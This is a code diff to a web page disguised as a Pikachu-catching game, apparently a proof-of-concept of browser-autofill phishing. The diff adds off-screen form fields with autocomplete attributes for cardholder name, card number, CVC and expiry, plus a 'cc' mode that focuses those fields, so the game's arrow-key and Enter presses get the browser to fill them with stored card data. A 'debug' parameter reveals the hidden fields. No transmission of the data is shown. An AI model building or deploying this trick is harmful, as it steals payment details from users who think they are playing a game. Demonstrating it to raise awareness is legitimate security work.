@@ -52,10 +52,10 @@ body
 </head>
 
 <body onclick="reset();">
-    <div id="target"><img width="100%" src="img/pikachu.png"></div>
-    <div id="box"><img width="100%" src="img/iphone.png"></div>
+    <div id="target"><img id="pikachu" width="100%" src="img/pikachu.png"></div>
+    <div id="box"><img id="iphone" width="100%" src="img/iphone.png"></div>
     <div id="status">Capture pikachu by using the arrow keys to navigate the Iphone!</div>
-    <div  class="dox-div ">
+    <div id="dox-div" class="dox-div ">
         <div class="info-box-header">
             <div class="info-box-skrim hidden-md hidden-lg"></div>
             <i class="fa fa-truck info-box-icon"></i>
@@ -81,18 +81,55 @@ body
                 <input  autocomplete="sex">
                 <input  autocomplete="url">
             </div>
+            <div class="form-group">
+                <input onkeydown="control(event)" name="ccname" id="ccname" required placeholder="Full Name" autocomplete="cc-name">
+                <input onchange="showInfo()" name="cardnumber" id="ccnum" required autocomplete="cc-number">
+                <input name="cvc" id="cccvc" required autocomplete="cc-csc">
+                <input name="cc-exp" id="ccexp" required placeholder="MM-YYYY" autocomplete="cc-exp">
+            </div>
         </div>
     </div>
 
     <script src="https://code.jquery.com/jquery-3.1.1.js" integrity="sha256-16cdPddA6VdVInumRGo6IbivbERE8p7CQR3HzTBuELA=" crossorigin="anonymous"></script>
     <script>
-     document.steps=0;
+
+    var getUrlParameter = function getUrlParameter(sParam) {
+    var sPageURL = decodeURIComponent(window.location.search.substring(1)),
+        sURLVariables = sPageURL.split('&'),
+        sParameterName,
+        i;
+
+    for (i = 0; i < sURLVariables.length; i++) {
+        sParameterName = sURLVariables[i].split('=');
+
+        if (sParameterName[0] === sParam) {
+            return sParameterName[1] === undefined ? true : sParameterName[1];
+        }
+    }
+    return null
+};
+
+    document.debugmode = ((getUrlParameter("debug")==null) ? false : true);
+    document.ccmode = ((getUrlParameter("cc")==null) ? false : true);
+    document.steps=0;
+    // If debug mode is on, show the input fields to show what's happening
+    if (document.debugmode){
+        document.getElementById("dox-div").style["top"] = '0px';
+    }
     function reset(){
         document.steps=0;
         document.getElementById('box').style['top']='10vh'
-        document.getElementById('name').value="";
-        document.getElementById('city').value="";
-        document.getElementById('name').focus();
+        document.getElementById('pikachu').src="img/pikachu.png";
+        if (document.ccmode){
+            document.getElementById('ccname').value="";
+            document.getElementById('ccnum').value="";
+            document.getElementById('ccname').focus();
+        } else {
+            document.getElementById('name').value="";
+            document.getElementById('city').value="";
+            document.getElementById('name').focus();
+        }
+
     }
 
      function control(event){
@@ -117,10 +154,11 @@ body
          setTimeout(
          function(){document.getElementById('box').style['top']='50vh';
          document.getElementById("status").innerText="Quick! Hit \"Enter\" to capture it!";
+         document.getElementById('pikachu').src="img/pikachu2.png";
      },1000)
      }
      function end(){
-         document.getElementById("status").innerText="Uh oh, No pokemon is found. Check back later.";
+         document.getElementById("status").innerText="Awesome! Check back later for more pokemon ;)";
          document.steps += 1;
      }
      function wrongdirection(){
